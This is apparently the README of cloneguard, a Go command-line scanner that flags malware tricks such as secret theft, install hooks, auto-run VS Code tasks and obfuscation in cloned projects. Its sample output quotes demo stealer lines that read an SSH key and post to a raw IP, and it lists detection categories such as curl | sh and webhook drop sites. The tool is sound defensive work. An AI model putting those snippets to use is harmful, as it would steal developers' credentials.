content_html:
Scan a project for malware tricks before you run it. Built after a fake-recruiter "demo app" tried to steal SSH and AWS keys.

cloneguard is a small, dependency-free Go command-line tool. It only reads files. It never runs, installs, or imports anything from the project it scans.

Why this exists

A common attack goes like this: someone posing as a recruiter sends you a "take-home assignment" or "demo app". You clone it, run npm install or open it in your editor, and it quietly uploads your SSH keys, cloud credentials, browser passwords or crypto wallets. Often the trigger isn't the app itself but an install hook or an editor task that runs the moment you open the folder.

cloneguard is a quick first look that catches the usual tricks, so you can decide whether the project is safe to touch.

Build

Requires Go 1.24+. There are no third-party dependencies.

go build -o cloneguard ./cmd/cloneguard

Optionally put the binary on your PATH, for example mv cloneguard /usr/local/bin/.

Usage

cloneguard clone https://github.com/someone/demo-app   # clone, then scan right away
cloneguard scan ./some-folder                          # scan an existing folder
cloneguard scan                                        # scan the current folder
cloneguard ./some-folder                               # shorthand for scan
cloneguard scan --json ./some-folder                   # machine-readable output

clone runs git clone (which downloads files but does not execute project code) into a folder named after the repo, or into [dir] if you give one, then scans it.

Other commands: cloneguard help, cloneguard version.

Flags

Flags go before the path.

Flag Meaning
--json Print results as JSON instead of text
--include-deps Also scan node_modules (slow; skipped by default)
--max-size-mb N Skip files larger than N MB (default 2)
--no-color Plain output. Also honored: the NO_COLOR env var and TERM=dumb

Exit codes

Code Verdict Meaning
0 clean No red flags found
1 caution Only medium-severity findings
2 suspicious At least one high-severity finding
3 dangerous At least one critical finding
10 error Bad usage, unreadable path, or git clone failed

This makes it easy to use in scripts or a git hook, e.g. cloneguard scan . || exit 1.

Example

Scanning the bundled demo/ folder, which contains a fake stealer and an auto-run VS Code task:

$ cloneguard scan --no-color demo

 DANGEROUS  Do not run or install anything from this project.
1 critical, 2 high, 1 medium, 0 low

[CRITICAL] util.js:1  Reaches for your secrets AND talks to a suspicious server
[HIGH] .vscode/tasks.json:1  Runs a command the moment you open the folder
[HIGH] util.js:1  Touches your SSH keys
    > readFile("~/.ssh/id_rsa");
[MEDIUM] util.js:2  Connects to a raw IP address
    > fetch("http://203.0.113.7:8080/upload");

Each finding shows the file and line, the offending snippet, and a plain-English explanation of why it matters. (Output above is abbreviated.)

JSON output

With --json the result has this shape:

{
  "root": "demo",
  "files_scanned": 2,
  "files_skipped": 0,
  "findings": [
    { "rule": "reads-ssh-keys", "title": "Touches your SSH keys",
      "severity": "high", "file": "util.js", "line": 1,
      "snippet": "...", "why": "..." }
  ],
  "verdict": "dangerous"
}

What it looks for

  • Secret theft: code that reaches for SSH keys, cloud credentials (AWS, GCP, Azure, Kubernetes, Docker, npm, Git), shell history, browser passwords, wallets, or dumps all environment variables
  • Suspicious network use: connections to raw IPs, webhook/paste/request-catcher drop-off sites (Discord webhooks, Telegram bots, pastebin, webhook.site, ...), public tunnel services, or base64-hidden URLs
  • Download-and-run: code that downloads or decodes text and then executes it (eval, new Function, curl | sh)
  • Auto-run hooks: npm install scripts, .vscode/tasks.json tasks that run when the folder is opened, risky setup.py
  • Obfuscation: scrambled code such as _0x identifiers, hex escapes, or code hidden behind long runs of whitespace
  • Compiled binaries (.exe, .dll, .so, .dylib, .node, ...) checked into the repo
  • Dangerous combinations in one file, such as reading keys AND talking to a suspicious server, which is escalated to critical

How it works

  1. Walks the folder, skipping .git, node_modules, __pycache__, .venv and venv (unless --include-deps), plus files over the size limit.
  2. Classifies each file as code, config, docs, lockfile or binary, and applies only the rules that make sense for that kind (docs and lockfiles are ignored for text rules).
  3. Runs line-by-line regex rules and per-file checks (for example parsing package.json for install hooks).
  4. Combines findings: if one file has hits from multiple risky categories (credentials, network, dynamic execution, obfuscation), it raises a combined finding.
  5. Picks a verdict from the worst severity found (see exit codes above).

Limits

"No red flags found" is not proof of safety. It only means none of these common tricks were spotted. cloneguard is pattern-based, so determined attackers can evade it, and it can produce false positives on legitimate code (a password manager should touch browser data). For code from strangers, still use a throwaway VM or container.

Develop

go test ./...

Layout:

  • cmd/cloneguard/main.go: CLI, flags and clone handling
  • internal/scanner/rules.go: line-level detection rules (ID, severity, regex, explanation)
  • internal/scanner/filechecks.go: per-file checks (package.json hooks, tasks.json, setup.py, binaries)
  • internal/scanner/scanner.go: directory walk, file classification, verdict logic
  • internal/report/report.go: human-readable text output
  • demo/: a deliberately malicious sample for trying the tool

To add a detection, append a rule to lineRules in rules.go with an id, title, severity, category, scope, regex and a plain-English why, then add a test in internal/scanner/scanner_test.go.

License

MIT. See LICENSE.
